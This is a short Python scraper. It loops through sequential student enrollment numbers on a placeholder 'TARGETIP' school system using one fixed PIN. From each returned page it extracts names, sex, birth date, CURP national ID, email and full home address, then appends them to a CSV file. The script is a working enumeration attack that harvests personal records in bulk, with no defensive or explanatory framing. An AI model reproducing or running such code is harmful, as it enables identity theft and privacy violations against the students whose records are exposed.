from email import header
from bs4 import BeautifulSoup
import requests
import pandas as pd


def req():
    n = 70000
    while n < 70012:
        yield n
        n +=1

for i in range(70010,70090):
    datos = {'sistema':'1','matricula':i,'nip':'2$/PKi/$$45o6422f'}
    r = requests.get('TARGETIP',params=datos)

    soup = BeautifulSoup(r.text,'html.parser')

    bonito = soup.get_text()
    n = bonito.splitlines()
    a_paterno = n[9].replace('Ap. Paterno: ','')
    a_materno = n[10].replace('Ap. Materno:','')
    nombre = n[11].replace('Nombre: ','')
    sexo = n[12].replace('Sexo: ','')
    f_nac = n[13].replace('Fecha de Nacimiento: ','')
    curp = n[14].replace('CURP: ','')
    email = n[15].replace('e-mail: ','')
    estado_Nac = n[17].replace('Estado de Nacimiento: ','')
    esstado = n[23].replace('Estado: ','')
    ciudad = n[24].replace('Ciudad: ','')
    colonia = n[25].replace('Colonia: ','')
    cp = n[26].replace('CP: ','')
    calle = n[27].replace('Calle: ','')
    numero = n[32]
    superdatos= []
    dict = {'Apellido Paterno':[a_paterno],'Apellido Materno':[a_materno],'Nombre':[nombre],'Sexo':sexo,'Nac':f_nac,'Curp':curp,'email':email,'estado':estado_Nac,'nac':esstado,'ciudad':ciudad,'colonia':colonia,'cp':cp,'calle':calle,'numero':numero}
    df = pd.DataFrame(dict)

    df.to_csv('superdatos.csv',mode='a',header=False)
    



        
